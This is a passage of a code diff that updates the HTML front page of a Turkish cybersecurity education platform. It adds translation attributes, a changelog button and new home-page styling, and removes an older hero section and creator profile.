@@ -10,8 +10,10 @@
     <link
         href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Cascadia+Code:wght@400;600;700&display=swap"
         rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=3.9">
-    <link rel="stylesheet" href="animations.css?v=3.9">
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#00e5ff">
+    <link rel="stylesheet" href="style.css?v=4.3">
+    <link rel="stylesheet" href="animations.css?v=4.3">
 </head>
 
 <body class="theme-corporate-cyber">
@@ -118,11 +120,11 @@
                             <rect x="3" y="14" width="7" height="7" />
                         </svg>
                     </span>
-                    <span class="nav-label">Komuta Merkezi</span>
+                    <span class="nav-label" data-i18n="nav_cmd">Komuta Merkezi</span>
                     <span class="nav-badge" id="badge-incident-count">LIVE</span>
                 </button>
 
-                <div class="nav-section-label">AKADEMİ &amp; EĞİTİM</div>
+                <div class="nav-section-label" data-i18n="nav_section_academy">AKADEMİ &amp; EĞİTİM</div>
 
                 <!-- BEGINNER FRIENDLY CYBER ACADEMY (15 BÖLÜM EĞİTİM PLANI) -->
                 <a href="academy.html" class="nav-btn" style="text-decoration: none;">
@@ -133,9 +135,9 @@
                             <path d="M6 12v5c3 3 9 3 12 0v-5" />
                         </svg>
                     </span>
-                    <span class="nav-label">Siber Akademi (Eğitim)</span>
+                    <span class="nav-label" data-i18n="nav_academy">Siber Akademi (Eğitim)</span>
                     <span class="nav-badge-new"
-                        style="background: rgba(16, 185, 129, 0.2); color: var(--green); border: 1px solid var(--green);">EĞİTİM</span>
+                        style="background: rgba(16, 185, 129, 0.2); color: var(--green); border: 1px solid var(--green);" data-i18n="badge_education">EĞİTİM</span>
                 </a>
 
                 <!-- 140+ SİBER KOD KÜTÜPHANESİ (AYRI YER) -->
@@ -147,10 +149,9 @@
                             <polyline points="8 6 2 12 8 18" />
                         </svg>
                     </span>
-                    <span class="nav-label">Siber Kod Kütüphanesi</span>
+                    <span class="nav-label" data-i18n="nav_commands">Siber Kod Kütüphanesi</span>
                     <span class="nav-badge-new"
-                        style="background: rgba(0, 229, 255, 0.2); color: var(--cyan); border: 1px solid var(--cyan);">140+
-                        KOD</span>
+                        style="background: rgba(0, 229, 255, 0.2); color: var(--cyan); border: 1px solid var(--cyan);" data-i18n="badge_140_codes">140+ KOD</span>
                 </button>
 
                 <button class="nav-btn" data-page="page-terminal">
@@ -161,13 +162,13 @@
                             <line x1="12" y1="19" x2="20" y2="19" />
                         </svg>
                     </span>
-                    <span class="nav-label">Kali Web Terminal</span>
+                    <span class="nav-label" data-i18n="nav_terminal">Kali Web Terminal</span>
                     <span class="nav-badge-new"
                         style="background: rgba(0, 229, 255, 0.2); color: var(--cyan); border: 1px solid var(--cyan);">LIVE
                         CLI</span>
                 </button>
 
-                <div class="nav-section-label">TEST &amp; DEĞERLENDİRME</div>
+                <div class="nav-section-label" data-i18n="nav_section_eval">TEST &amp; DEĞERLENDİRME</div>
 
                 <button class="nav-btn" data-page="page-quiz">
                     <span class="nav-icon" style="color: #c084fc;">
@@ -178,10 +179,9 @@
                             <line x1="12" y1="17" x2="12.01" y2="17" />
                         </svg>
                     </span>
-                    <span class="nav-label">Siber Rol Testi</span>
+                    <span class="nav-label" data-i18n="nav_quiz">Siber Rol Testi</span>
                     <span class="nav-badge-new"
-                        style="background: rgba(192, 132, 252, 0.2); color: #c084fc; border: 1px solid #c084fc;">10
-                        SORU</span>
+                        style="background: rgba(192, 132, 252, 0.2); color: #c084fc; border: 1px solid #c084fc;" data-i18n="badge_10_questions">10 SORU</span>
                 </button>
 
                 <button class="nav-btn" data-page="page-ctf">
@@ -192,10 +192,9 @@
                             <line x1="4" y1="22" x2="4" y2="15" />
                         </svg>
                     </span>
-                    <span class="nav-label">Siber CTF Arenası</span>
+                    <span class="nav-label" data-i18n="nav_ctf">Siber CTF Arenası</span>
                     <span class="nav-badge-new"
-                        style="background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid #ef4444;">6
-                        SEVİYE</span>
+                        style="background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid #ef4444;" data-i18n="badge_6_levels">10 SEVİYE</span>
                 </button>
 
                 <div class="nav-section-label" data-i18n="nav_section_guide">REHBER &amp; SÖZLÜK</div>
@@ -213,6 +212,23 @@
                     <span class="nav-badge-new"
                         style="background: rgba(0, 229, 255, 0.15); color: var(--cyan); border-color: var(--cyan);">A-Z</span>
                 </button>
+
+                <!-- SYSTEM CHANGELOG / UPDATE LOG -->
+                <button class="nav-btn" id="nav-btn-changelog" type="button">
+                    <span class="nav-icon" style="color: #a855f7;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                            <polyline points="14 2 14 8 20 8"></polyline>
+                            <line x1="16" y1="13" x2="8" y2="13"></line>
+                            <line x1="16" y1="17" x2="8" y2="17"></line>
+                            <polyline points="10 9 9 9 8 9"></polyline>
+                        </svg>
+                    </span>
+                    <span class="nav-label" data-i18n="nav_changelog">Güncelleme Günlüğü</span>
+                    <span class="nav-badge-new"
+                        style="background: rgba(168, 85, 247, 0.2); color: #c084fc; border: 1px solid #c084fc;">v4.1</span>
+                </button>
+
 
                 <!-- ADMIN ONLY: LIVE VISITOR & AUDIT LOGS -->
                 <div class="nav-section-label" id="nav-section-admin" style="display: none; color: var(--red);">YÖNETİCİ
@@ -273,13 +289,13 @@
                 </div>
 
                 <div class="topbar-right">
-                    <button class="search-command-btn" id="btn-quick-search">
+                    <button class="search-command-btn" id="btn-quick-search" data-i18n-title="topbar_search_title">
                         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2">
                             <circle cx="11" cy="11" r="8" />
                             <line x1="21" y1="21" x2="16.65" y2="16.65" />
                         </svg>
-                        <span>Siber Komutları ve Terimleri Ara... (Ctrl+K)</span>
+                        <span data-i18n="topbar_search">Siber Komutları ve Terimleri Ara... (Ctrl+K)</span>
                         <kbd>Ctrl+K</kbd>
                     </button>
 
@@ -287,10 +303,19 @@
                     <button class="topbar-pill-btn" id="btn-replay-intro"
                         title="Kali Ejderhası Açılış Animasyonunu Tekrar Oynat"
                         style="border-color: rgba(0, 229, 255, 0.4); color: var(--cyan);">
-                        <span>🐉 Kali Animasyonu</span>
+                        <span data-i18n="topbar_dragon">🐉 Kali Animasyonu</span>
                     </button>
 
-                    <!-- LANGUAGE TOGGLE BUTTON (TR / EN) -->
+                                        <!-- UPDATE LOG / CHANGELOG BUTTON -->
+                    <button type="button" class="topbar-pill-btn" id="btn-changelog-toggle"
+                        title="Platform Güncelleme Günlüğü / Changelog (v4.1)"
+                        style="border-color: rgba(168, 85, 247, 0.45); color: #c084fc; display: inline-flex; align-items: center; gap: 6px; cursor: pointer;">
+                        <span style="font-size: 13px;">🚀</span>
+                        <span data-i18n="topbar_updates">v4.2 Güncellemeleri</span>
+                        <span style="display:inline-block; width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 6px #10b981;"></span>
+                    </button>
+
+<!-- LANGUAGE TOGGLE BUTTON (TR / EN) -->
                     <button type="button" class="topbar-pill-btn" id="btn-language-toggle" title="Dil Değiştir / Switch Language (TR/EN)" style="border-color: rgba(0, 229, 255, 0.4); color: var(--cyan); display: inline-flex; align-items: center; gap: 6px; cursor: pointer;">
                         <span style="font-size: 13px;">🌐</span>
                         <span id="current-lang-label" style="font-weight: 800; font-family: var(--font-mono); letter-spacing: 0.5px;">EN</span>
@@ -349,423 +374,517 @@
             <!-- DYNAMIC PAGES -->
             <main class="page-stage" id="page-stage">
 
-                <!-- ==========================================
-                     PAGE 1: COMMAND CENTER (Dashboard with Guided Journey Flow)
-                     ========================================== -->
-                                <section class="app-page page-active" id="page-dashboard">
-                    <div class="hero-console-wrapper">
-                        <!-- 1. Ambient Radial Light Glow (Obfuscator Style) -->
-                        <div class="hero-ambient-glow"></div>
+<section class="app-page page-active" id="page-dashboard">
+                    <style>
+                        /* LFL Ana Sayfa Yenileme Mimarisi (v4.4) - Smooth Scroll & Kompakt Odak */
+                        .app-main, html, body {
+                            scroll-behavior: smooth;
+                        }
+                        .lfl-home-wrapper {
+                            max-width: 1180px;
+                            margin: 0 auto;
+                            padding: 18px 20px 48px 20px;
+                            display: flex;
+                            flex-direction: column;
+                            gap: 28px;
+                        }
+                        /* BÖLÜM 1: HERO (Sıfır Yük, Net Çağrı) */
+                        .lfl-hero-clean {
+                            position: relative;
+                            text-align: center;
+                            padding: 36px 24px 32px 24px;
+                            border-radius: 20px;
+                            background: radial-gradient(circle at 50% 0%, rgba(16, 185, 129, 0.12), rgba(15, 23, 42, 0.88) 70%);
+                            border: 1px solid rgba(56, 189, 248, 0.2);
+                            box-shadow: 0 18px 45px rgba(0, 0, 0, 0.4);
+                        }
+                        .lfl-hero-badge {
+                            display: inline-flex;
+                            align-items: center;
+                            gap: 8px;
+                            padding: 6px 16px;
+                            border-radius: 999px;
+                            background: rgba(16, 185, 129, 0.12);
+                            border: 1px solid rgba(16, 185, 129, 0.35);
+                            color: #34d399;
+                            font-size: 12.5px;
+                            font-weight: 700;
+                            letter-spacing: 0.3px;
+                            margin-bottom: 16px;
+                        }
+                        .lfl-hero-h1 {
+                            font-size: clamp(28px, 4.2vw, 46px);
+                            font-weight: 900;
+                            color: #ffffff;
+                            letter-spacing: -0.8px;
+                            line-height: 1.15;
+                            margin: 0 auto 14px auto;
+                            background: linear-gradient(95deg, #ffffff 0%, #a7f3d0 55%, #38bdf8 100%);
+                            -webkit-background-clip: text;
+                            -webkit-text-fill-color: transparent;
+                        }
+                        .lfl-hero-subtitle {
+                            font-size: clamp(14.5px, 1.6vw, 17px);
+                            color: #cbd5e1;
+                            max-width: 720px;
+                            margin: 0 auto 24px auto;
+                            line-height: 1.65;
+                        }
+                        .lfl-hero-cta-row {
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            gap: 14px;
+                            flex-wrap: wrap;
+                        }
+                        .btn-lfl-primary-cta {
+                            display: inline-flex;
+                            align-items: center;
+                            gap: 10px;
+                            padding: 13px 26px;
+                            border-radius: 12px;
+                            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+                            color: #ffffff;
+                            font-size: 14.5px;
+                            font-weight: 800;
+                            border: 1px solid rgba(52, 211, 153, 0.5);
+                            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.35);
+                            cursor: pointer;
+                            transition: all 0.22s ease;
+                            text-decoration: none;
+                        }
+                        .btn-lfl-primary-cta:hover {
+                            transform: translateY(-2px);
+                            box-shadow: 0 12px 30px rgba(16, 185, 129, 0.5);
+                        }
+                        .btn-lfl-secondary-cta {
+                            display: inline-flex;
+                            align-items: center;
+                            gap: 8px;
+                            padding: 13px 22px;
+                            border-radius: 12px;
+                            background: rgba(15, 23, 42, 0.65);
+                            color: #e2e8f0;
+                            font-size: 14px;
+                            font-weight: 700;
+                            border: 1px solid rgba(56, 189, 248, 0.35);
+                            cursor: pointer;
+                            transition: all 0.22s ease;
+                        }
+                        .btn-lfl-secondary-cta:hover {
+                            background: rgba(56, 189, 248, 0.12);
+                            border-color: #38bdf8;
+                            color: #ffffff;
+                            transform: translateY(-2px);
+                        }
 
-                        <!-- 2. Hero Focus Block (Vurucu Başlık & 3 Eylem Butonu) -->
-                        <div class="hero-focus-block" data-reveal>
-                            <div class="hero-pill-capsule">
-                                <span class="pulsing-beacon" style="background: var(--cyan); box-shadow: 0 0 10px var(--cyan);"></span>
-                                <span>CYBER COMMAND MATRIX // ZERO-TRUST ACTIVE</span>
-                            </div>
-                            <h1 class="hero-main-title">
-                                LFL // NEXT-GEN CYBER COMMAND CENTER
-                            </h1>
-                            <p class="hero-tagline-lead">
-                                <span data-i18n="hero_sub">Ofansif ve Defansif Siber Güvenlik Mimarisi • Canlı Operasyon Alanı</span>
-                            </p>
-                            <div class="hero-actions-cluster">
-                                <button type="button" class="btn-hero-start-academy" id="btn-hero-role-quiz">
-                                    <span data-i18n="btn_hero_quiz">🎯 Siber Rol Testini Çöz (10 Soru)</span>
-                                    <span>&rarr;</span>
-                                </button>
-                                <button type="button" class="btn-hero-shield-test" id="btn-hero-test-shield">
-                                    <span data-i18n="btn_hero_shield">🛡️ Canlı Kalkan Testi</span>
-                                </button>
+                        /* BÖLÜM 2: HIZLI SEVİYE SEÇİCİ (3 MİNİ KART) */
+                        .quick-level-selector-grid {
+                            display: grid;
+                            grid-template-columns: repeat(3, 1fr);
+                            gap: 16px;
+                        }
+                        @media (max-width: 900px) {
+                            .quick-level-selector-grid {
+                                grid-template-columns: 1fr;
+                            }
+                        }
+                        .level-selector-card {
+                            background: rgba(15, 23, 42, 0.82);
+                            border: 1px solid rgba(148, 163, 184, 0.18);
+                            border-radius: 14px;
+                            padding: 18px 20px;
+                            display: flex;
+                            flex-direction: column;
+                            justify-content: space-between;
+                            gap: 12px;
+                            cursor: pointer;
+                            transition: all 0.22s ease;
+                            text-align: left;
+                        }
+                        .level-selector-card:hover {
+                            transform: translateY(-3px);
+                            border-color: rgba(0, 229, 255, 0.45);
+                            box-shadow: 0 10px 28px rgba(0, 0, 0, 0.35);
+                        }
+                        .level-card-top {
+                            display: flex;
+                            align-items: center;
+                            gap: 10px;
+                        }
+                        .level-card-num {
+                            font-family: var(--font-mono, monospace);
+                            font-size: 12px;
+                            font-weight: 800;
+                            padding: 4px 9px;
+                            border-radius: 6px;
+                            background: rgba(0, 229, 255, 0.12);
+                            color: #38bdf8;
+                            border: 1px solid rgba(0, 229, 255, 0.3);
+                        }
+                        .level-card-num.num-green {
+                            background: rgba(16, 185, 129, 0.14);
+                            color: #34d399;
+                            border-color: rgba(16, 185, 129, 0.35);
+                        }
+                        .level-card-num.num-purple {
+                            background: rgba(168, 85, 247, 0.15);
+                            color: #c084fc;
+                            border-color: rgba(168, 85, 247, 0.35);
+                        }
+                        .level-card-title {
+                            font-size: 16px;
+                            font-weight: 800;
+                            color: #f8fafc;
+                            margin: 0;
+                        }
+                        .level-card-who {
+                            font-size: 13px;
+                            color: #94a3b8;
+                            line-height: 1.5;
+                            margin: 0;
+                        }
+                        .level-card-action {
+                            display: inline-flex;
+                            align-items: center;
+                            gap: 6px;
+                            font-size: 12.5px;
+                            font-weight: 700;
+                            color: #38bdf8;
+                            font-family: var(--font-mono, monospace);
+                        }
+                        .level-selector-card.card-zero .level-card-action { color: #34d399; }
+                        .level-selector-card.card-direct .level-card-action { color: #c084fc; }
 
-                            </div>
-                        </div>
+                        /* Starter Step Highlight Pulse when scrolled to */
+                        .root-step-pill {
+                            text-decoration: none;
+                            color: inherit;
+                            transition: all 0.25s ease;
+                        }
+                        .root-step-pill.step-highlight-flash {
+                            border-color: #10b981 !important;
+                            background: rgba(16, 185, 129, 0.25) !important;
+                            box-shadow: 0 0 22px rgba(16, 185, 129, 0.65) !important;
+                            transform: scale(1.04);
+                        }
 
-                        <!-- 3. Merkezi İnteraktif Siber Konsol (Obfuscator.io Style Playground) -->
-                        <div class="obf-cyber-console" data-reveal>
-                            <!-- Console Header Bar: Mac Dots + Buffer Name + 4 Scenario Tabs + Replay -->
-                            <div class="obf-console-top">
-                                <div class="obf-window-dots">
-                                    <span class="obf-dot obf-dot-red"></span>
-                                    <span class="obf-dot obf-dot-yellow"></span>
-                                    <span class="obf-dot obf-dot-green"></span>
-                                    <span class="obf-buffer-label">lfl-interactive-console // buffer: shield_telemetry.sys</span>
-                                </div>
-                                <div class="obf-scenario-tabs" id="obf-scenario-tabs">
-                                    <button type="button" class="obf-tab-btn active" data-scenario="sqli" id="btn-sim-sqli">
-                                        <span class="obf-tab-indicator red"></span>
-                                        <span>SQLi Savunması</span>
-                                    </button>
-                                    <button type="button" class="obf-tab-btn" data-scenario="zerotrust">
-                                        <span class="obf-tab-indicator blue"></span>
-                                        <span>Zero-Trust Kalkanı</span>
-                                    </button>
-                                    <button type="button" class="obf-tab-btn" data-scenario="xss">
-                                        <span class="obf-tab-indicator yellow"></span>
-                                        <span>XSS Filtresi</span>
-                                    </button>
-                                    <button type="button" class="obf-tab-btn" data-scenario="bruteforce">
-                                        <span class="obf-tab-indicator purple"></span>
-                                        <span>Brute-Force Karantinası</span>
-                                    </button>
-                                </div>
-                                <button type="button" class="obf-replay-btn" id="btn-obf-replay" title="Telemetriyi Yeniden Oynat">
-                                    <span>⚡ Replay</span>
-                                </button>
-                            </div>
+                        /* BÖLÜM 4: UZMANLIK KARTLARI HEDEF & KAPSAM ETİKETLERİ */
+                        .branch-meta-row {
+                            display: flex;
+                            align-items: center;
+                            gap: 8px;
+                            margin-bottom: 10px;
+                            font-size: 12.5px;
+                            color: #cbd5e1;
+                        }
+                        .branch-meta-label {
+                            font-weight: 800;
+                            color: #f8fafc;
+                            text-transform: uppercase;
+                            font-size: 11px;
+                            letter-spacing: 0.4px;
+                            padding: 2px 7px;
+                            border-radius: 4px;
+                            background: rgba(255, 255, 255, 0.07);
+                        }
 
-                            <!-- Console Screen Area (Editor Stream with Line Gutter) -->
-                            <div class="obf-console-screen">
-                                <div class="obf-line-gutter" id="obf-gutter">
-                                    01<br>02<br>03<br>04<br>05<br>06
-                                </div>
-                                <div class="obf-screen-stream" id="obf-stream-body">
-                                    <span style="color: #64748b;">[BAŞLATILIYOR] Telemetri yükleniyor...</span>
-                                </div>
-                            </div>
+                        /* BÖLÜM 5: PLATFORMUN GERÇEK TEKNİK GÜCÜ (FOOTER ÖNCESİ 3 MİNİMALİST KART) */
+                        .real-power-footer-grid {
+                            display: grid;
+                            grid-template-columns: repeat(3, 1fr);
+                            gap: 16px;
+                            margin-top: 8px;
+                            padding-top: 20px;
+                            border-top: 1px solid rgba(148, 163, 184, 0.12);
+                        }
+                        @media (max-width: 900px) {
+                            .real-power-footer-grid {
+                                grid-template-columns: 1fr;
+                            }
+                        }
+                        .real-power-card {
+                            background: rgba(15, 23, 42, 0.6);
+                            border: 1px solid rgba(148, 163, 184, 0.14);
+                            border-radius: 12px;
+                            padding: 16px 18px;
+                            display: flex;
+                            flex-direction: column;
+                            gap: 8px;
+                        }
+                        .real-power-title {
+                            display: flex;
+                            align-items: center;
+                            gap: 8px;
+                            font-size: 13.5px;
+                            font-weight: 800;
+                            color: #f8fafc;
+                        }
+                        .real-power-desc {
+                            font-size: 12.8px;
+                            color: #94a3b8;
+                            line-height: 1.55;
+                            margin: 0;
+                        }
+                        .dev-compact-links {
+                            display: flex;
+                            align-items: center;
+                            gap: 8px;
+                            flex-wrap: wrap;
+                            margin-top: 4px;
+                        }
+                        .dev-mini-link {
+                            font-size: 11.5px;
+                            font-weight: 700;
+                            color: #38bdf8;
+                            background: rgba(56, 189, 248, 0.1);
+                            border: 1px solid rgba(56, 189, 248, 0.25);
+                            padding: 4px 10px;
+                            border-radius: 6px;
+                            text-decoration: none;
+                            transition: all 0.18s ease;
+                        }
+                        .dev-mini-link:hover {
+                            background: rgba(56, 189, 248, 0.2);
+                            color: #ffffff;
+                        }
+                    </style>
 
-                            <!-- Console Bottom Status Strip: DEFCON, Kernel, Kestrel -->
-                            <div class="obf-status-strip">
-                                <div class="obf-status-item">
-                                    <span class="obf-status-label">DEFCON SEVİYESİ</span>
-                                    <div class="obf-status-value defcon">
-                                        <span class="pulsing-beacon" style="background: #10b981; box-shadow: 0 0 10px #10b981; width: 8px; height: 8px;"></span>
-                                        <span>DEFCON 4 // STABLE</span>
-                                    </div>
-                                </div>
-                                <div class="obf-status-item">
-                                    <span class="obf-status-label">KERNEL GÜVENLİK NOTU</span>
-                                    <div class="obf-status-value kernel">
-                                        <span>🛡️ A+ Zero-Trust (SOC2 Standard)</span>
-                                    </div>
-                                </div>
-                                <div class="obf-status-item">
-                                    <span class="obf-status-label">KESTREL SUNUCU İMZASI</span>
-                                    <div class="obf-status-value kestrel">
-                                        <span>👁️ GİZLENDİ / STEALTH (Banner Redacted)</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+                    <div class="lfl-home-wrapper">
 
-                        <!-- 4. Platform Misyonu, Yapımcı Profili ve 3D Tilt Mimariler -->
-                        <div class="about-platform-section" data-reveal>
-                            <!-- Dual Grid: Sitenin Amacı + Yapımcı -->
-                            <div class="about-dual-grid">
-                                <!-- Sitenin Amacı & Vizyonu -->
-                                <div class="about-glass-card">
-                                    <div class="about-card-badge">
-                                        <span class="pulsing-beacon" style="background: var(--cyan); box-shadow: 0 0 8px var(--cyan);"></span>
-                                        <span>LFL // PLATFORM VİZYONU &amp; MİSYON</span>
-                                    </div>
-                                    <h2 class="about-card-title">Siber Güvenlikte Yeni Nesil Canlı Operasyon Sahası</h2>
-                                    <p class="about-card-lead">
-                                        <strong>Lost From Light (LFL)</strong>; ofansif (Red Team) ve defansif (Blue Team) siber güvenlik yetkinliklerini tek bir etkileşimli çatı altında birleştiren yeni nesil bir siber simülasyon ve tatbikat merkezidir. Ezberci eğitimlerin aksine, canlı terminal simülasyonları, RFC protokol derinliği ve günlük hayat analojileriyle sıfırdan uzmanlığa pratik refleksler kazandırmayı hedefler.
-                                    </p>
-                                    <div class="about-features-list">
-                                        <div class="about-feature-item">
-                                            <span class="about-feature-icon">🎯</span>
-                                            <span><strong>27+ İnteraktif Görev Odası:</strong> TryHackMe &amp; Hack The Box standardında ofansif ve defansif laboratuvarlar.</span>
-                                        </div>
-                                        <div class="about-feature-item">
-                                            <span class="about-feature-icon">⚡</span>
-                                            <span><strong>143+ Kali Linux Aracı:</strong> Nmap'ten BloodHound'a, Wireshark'tan Mimikatz'e çalışan komut motoru.</span>
-                                        </div>
-                                        <div class="about-feature-item">
-                                            <span class="about-feature-icon">🛡️</span>
-                                            <span><strong>%100 Zero-Trust Mimarisi:</strong> Gerçek kurumsal sistemlerde kullanılan modern defansif başlıklar ve ilkeler.</span>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <!-- Yapımcı & Geliştirici Profili -->
-                                <div class="about-glass-card">
-                                    <div class="about-card-badge" style="border-color: rgba(56, 189, 248, 0.4); color: #38bdf8;">
-                                        <span class="pulsing-beacon" style="background: #38bdf8; box-shadow: 0 0 8px #38bdf8;"></span>
-                                        <span>YAPIMCI &amp; PLATFORM MİMARI</span>
-                                    </div>
-                                    <div class="creator-profile-header">
-                                        <div class="creator-avatar-box">BW</div>
-                                        <div>
-                                            <div class="creator-meta-name">burak_wyxz <span style="font-size: 13px; color: #94a3b8; font-weight: 400;">(Burak Bezmen)</span></div>
-                                            <div class="creator-meta-role">Platform Mimarı &amp; Full-Stack / Siber Güvenlik Öğrencisi</div>
-                                        </div>
-                                    </div>
-                                    <p class="about-card-lead">
-                                        Merhaba! Bu platformun kurucusu ve geliştiricisiyim. Hem <strong>Full-Stack Web Mimarileri</strong> (C# .NET 8, ASP.NET Core, EF SQLite) hem de <strong>Siber Güvenlik</strong> (Red, Blue, Purple Team simülasyonları, Kali Linux araçları, Zero-Trust sertleştirme) alanlarında kendimi tutkuyla eğitiyor ve geliştiriyorum. Bu projeyi hem öğrendiğim kurumsal mimarileri hayata geçirmek hem de siber güvenliğe sıfırdan başlayanlara modern bir rehber sunmak için inşa ettim.
-                                    </p>
-                                    <div class="creator-social-links">
-                                        <a href="https://www.linkedin.com/in/burak-bezmen-a177833a8/" target="_blank" rel="noopener noreferrer" class="creator-social-btn">
-                                            <span>💼 LinkedIn: Burak Bezmen</span>
-                                            <span>&nearr;</span>
-                                        </a>
-                                        <a href="https://youtube.com/@burak_wyxz" target="_blank" rel="noopener noreferrer" class="creator-social-btn">
-                                            <span>▶ YouTube: @burak_wyxz</span>
-                                            <span>&nearr;</span>
-                                        </a>
-                                        <div class="creator-social-btn btn-copy-social" data-copy="weavers_thread1th" style="cursor: pointer;" title="Discord Kullanıcı Adını Kopyala">
-                                            <span>💬 Discord: weavers_thread1th</span>
-                                            <span class="dev-copy-icon">⧉</span>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Mimariler ve Güvenlik Yapıları Başlığı -->
-                            <div class="architecture-header-block">
-                                <div class="about-card-badge" style="border-color: rgba(16, 185, 129, 0.4); color: #34d399;">
-                                    <span>⚙️ KULLANILAN TEKNOLOJİLER &amp; GÜVENLİK MİMARİSİ</span>
-                                </div>
-                                <h2 class="architecture-section-title">Endüstriyel Standartlarda Altyapı &amp; Savunma Mimarisi</h2>
-                                <p class="architecture-section-sub">
-                                    LFL Platformunda sıfır taviz ilkesiyle uygulanan modern web, veri ve güvenlik mühendisliği katmanları. (Kartların üzerine gelerek 3D derinliği test edebilirsiniz)
-                                </p>
-                            </div>
-
-                            <!-- 3D Tilt Mimariler Grid (6 Kart) -->
-                            <div class="architecture-grid">
-                                <!-- Kart 1: C# .NET 8 & Kestrel Core -->
-                                <div class="tilt-3d-card" data-tilt>
-                                    <div class="tilt-glare"></div>
-                                    <div class="tilt-card-header">
-                                        <div class="tilt-card-icon">⚡</div>
-                                        <span class="tilt-card-tag">BACKEND KERNEL</span>
-                                    </div>
-                                    <h3 class="tilt-card-title">C# .NET 8 &amp; ASP.NET Core</h3>
-                                    <p class="tilt-card-desc">
-                                        Asenkron request pipeline, yüksek verimli mikro-servis mimarisi ve gizlenmiş sunucu imzasıyla (Kestrel Banner Redaction) saldırgan keşiflerini felç eden güçlü sunucu altyapısı.
-                                    </p>
-                                </div>
-
-                                <!-- Kart 2: Entity Framework Core & SQLite -->
-                                <div class="tilt-3d-card" data-tilt>
-                                    <div class="tilt-glare"></div>
-                                    <div class="tilt-card-header">
-                                        <div class="tilt-card-icon">🗄️</div>
-                                        <span class="tilt-card-tag">ORM &amp; SQLi KALKANI</span>
-                                    </div>
-                                    <h3 class="tilt-card-title">Entity Framework &amp; LINQ</h3>
-                                    <p class="tilt-card-desc">
-                                        Tüm veritabanı sorguları dinamik string birleştirme yerine kesin parametrik LINQ ifadeleriyle bağlanır. SQL Injection atak vektörleri baypas edilemez güvenli literal parametrelere dönüştürülür.
-                                    </p>
-                                </div>
-
-                                <!-- Kart 3: Zero-Trust & mTLS Güvenlik Mimarisi -->
-                                <div class="tilt-3d-card" data-tilt id="dash-card-purple-team">
-                                    <div class="tilt-glare"></div>
-                                    <div class="tilt-card-header">
-                                        <div class="tilt-card-icon">🛡️</div>
-                                        <span class="tilt-card-tag">ZERO-TRUST MODELİ</span>
-                                    </div>
-                                    <h3 class="tilt-card-title">Zero-Trust &amp; RBAC İzolasyonu</h3>
-                                    <p class="tilt-card-desc">
-                                        "Asla güvenme, her zaman doğrula" kuralı. İç ağda bile her istek kimlik doğrulamasına ve mTLS şifrelemesine tabidir. Yetkisiz yatay geçiş (lateral movement) anında engellenir.
-                                    </p>
-                                </div>
-
-                                <!-- Kart 4: Security Headers Hardening -->
-                                <div class="tilt-3d-card" data-tilt>
-                                    <div class="tilt-glare"></div>
-                                    <div class="tilt-card-header">
-                                        <div class="tilt-card-icon">🔒</div>
-                                        <span class="tilt-card-tag">SEC-HEADERS HARDENING</span>
-                                    </div>
-                                    <h3 class="tilt-card-title">HSTS Preload &amp; Katı CSP</h3>
-                                    <p class="tilt-card-desc">
-                                        Strict-Transport-Security (1 yıllık Preload), X-Frame-Options: DENY (Clickjacking kalkanı), nosniff ve CSP Whitelist ile tarayıcı seviyesinde tam zırhlama.
-                                    </p>
-                                </div>
-
-                                <!-- Kart 5: 143+ Canlı Kali Linux CLI Simülatörü -->
-                                <div class="tilt-3d-card" data-tilt>
-                                    <div class="tilt-glare"></div>
-                                    <div class="tilt-card-header">
-                                        <div class="tilt-card-icon">💻</div>
-                                        <span class="tilt-card-tag">TERMINAL ENGINE</span>
-                                    </div>
-                                    <h3 class="tilt-card-title">143+ Kali Komut Motoru</h3>
-                                    <p class="tilt-card-desc">
-                                        Nmap, Gobuster, Wireshark, Suricata, Hydra ve Mimikatz gibi endüstri standardı güvenlik araçlarını tarayıcıda sıfır gecikmeyle simüle eden yüksek etkileşimli Kali Web Terminali.
-                                    </p>
-                                </div>
-
-                                <!-- Kart 6: Vanilla High-Performance UI & Zero-CORS -->
-                                <div class="tilt-3d-card" data-tilt>
-                                    <div class="tilt-glare"></div>
-                                    <div class="tilt-card-header">
-                                        <div class="tilt-card-icon">🚀</div>
-                                        <span class="tilt-card-tag">FRONTEND MİMARİSİ</span>
-                                    </div>
-                                    <h3 class="tilt-card-title">Vanilla JS &amp; Yerel Mimari</h3>
-                                    <p class="tilt-card-desc">
-                                        Ağır harici kütüphaneler olmadan geliştirilen hafif frontend; fetch() veya CORS engellerine takılmadan dosya çift tıklandığında bile anında bellekten çalışan sıfır bağımlılıklı yapı.
-                                    </p>
-                                </div>
-                            </div>
-                        </div>
-
-                        
                         <!-- ==========================================
-                             CYBER SKILL TREE: SIFIRDAN BAŞLAYANLAR İÇİN PATİKA & YOL AĞACI
+                             BÖLÜM 1: HERO (YENİ NESİL KARŞILAMA ALANI)
                              ========================================== -->
-                        <div class="branching-skill-tree-container" id="branching-skill-tree" data-reveal>
-                            <div class="tree-header-block">
-                                <div class="tree-badge-pill">
-                                    <span class="tree-badge-dot"></span>
-                                    <span>🗺️ İNTERAKTİF SİBER YOL HARİTASI &amp; SKILL TREE</span>
+                        <div class="lfl-hero-clean" data-reveal>
+                            <div class="lfl-hero-badge">
+                                <span>🟢 Tarayıcı Tabanlı &bull; Kurulum Gerektirmez &bull; Sıfırdan Başlayanlar İçin</span>
+                            </div>
+                            <h1 class="lfl-hero-h1" data-i18n="hero_main_h1">
+                                Siber Güvenliği Yaparak Öğrenin.
+                            </h1>
+                            <p class="lfl-hero-subtitle" data-i18n="hero_sub">
